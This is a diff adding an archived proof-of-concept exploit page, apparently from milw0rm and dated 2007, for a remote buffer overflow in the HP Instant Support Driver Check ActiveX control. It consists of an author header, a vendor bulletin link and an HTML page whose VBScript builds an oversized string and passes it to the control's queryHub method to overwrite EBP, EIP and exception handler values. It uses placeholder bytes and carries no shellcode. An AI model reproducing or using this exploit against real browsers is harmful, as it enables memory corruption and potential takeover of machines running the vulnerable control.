@@ -1,0 +1,43 @@
+----------------------------------------------------------------------------------
+ HP Instant Support - Driver Check Remote Buffer Overflow Exploit
+
+ author: Carlo Di Dato (aka shinnai)
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ Tested on Windows XP Professional SP2 full patched with IE7
+
+ Special thanks to:
+ rgod for his support and friendship
+ John Morris from HP Software Security for his honesty
+ str0ke... for being str0ke :)
+
+ HP Security Bulletin:
+ http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01077597
+----------------------------------------------------------------------------------
+
+ <html>
+ <object classid='clsid:156BF4B7-AE3A-4365-BD88-95A75AF8F09D' id='test'></object>
+  <script language = 'vbscript'>
+   
+   buff             = String(222, "A")
+
+   get_EBP          = "cccc"
+
+   get_EIP          = unescape("aaaa")
+
+   buf1             = unescape("bbbb")
+
+   second_exception = unescape("%00%00%92%00")
+
+   first_exception  = unescape("%00%00%92%00")
+
+   buf2             = String(4000, "B")
+
+   egg              = buff + get_EBP + get_EIP + buf1 + second_exception + first_exception + buf2
+
+   test.queryHub egg
+ 
+ </script>
+</html>
+
+# milw0rm.com [2007-07-02]
